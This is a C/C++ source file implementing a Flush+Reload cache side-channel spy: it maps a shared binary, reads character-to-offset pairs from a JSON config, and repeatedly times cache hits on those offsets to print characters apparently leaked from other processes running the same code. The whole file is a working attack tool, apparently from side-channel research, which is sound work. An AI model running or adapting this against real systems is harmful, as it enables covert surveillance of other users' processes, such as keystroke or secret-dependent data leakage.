#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <time.h>

#include <jsoncpp/json/json.h>
#include <fstream>

#include "cacheutils.h"
#include <iostream>

//define your own cache miss threshold or use detect_flush_reload_threshold() from cacheutils.h
#define MISS_THRESHOLD 220

int main(int argc, char** argv)
{
  if (argc != 3)
  {    
    printf("usage: ./main <path-to-binary> <config.json>\n");
    return 1;
  }
  char* fname = argv[1];
  
  std::ifstream file_input(argv[2]);
  Json::Reader reader;
  Json::Value root;
  reader.parse(file_input, root);
  
  int fd = open(fname,O_RDONLY);
  if (fd < 3)
  {
    printf("error: failed to open file\n");
    return 2;
  }
  unsigned char* addr = (unsigned char*)mmap(0, 64*1024*1024, PROT_READ, MAP_SHARED, fd, 0);
  
  if (addr == MAP_FAILED)
  {
    printf("error: failed to mmap\n");
    return 2;
  }

  std::map<uint8_t,size_t> pause_map;

  while(1)
  {
    // iterate over found offsets and report 
    for (unsigned int i = 0; i < root.size(); i++ )
    {
        // Print the member names and values individually of an object
        for(unsigned int j = 0; j < root[i].getMemberNames().size(); j++)
        {
            // Member name and value
            uint64_t offset = root[i][root[i].getMemberNames()[j]].asUInt64();
            
            size_t timing = flush_reload_t(addr + offset);
            uint8_t leaked_val = root[i].getMemberNames()[j].at(0);

            if(timing <= MISS_THRESHOLD)
            {
              if(pause_map[leaked_val] >= 2000)
              {
                //printf("%c %zu %zu\n",leaked_val,timing,pause_map[leaked_val]);
                //sched_yield();
                printf("%c ",leaked_val);
                fflush(stdout);
              }
              pause_map[leaked_val] = 0;
            } 
            else
            {
              pause_map[leaked_val]++;
            }
            sched_yield();
        }
    }
  }
  return 0;
}
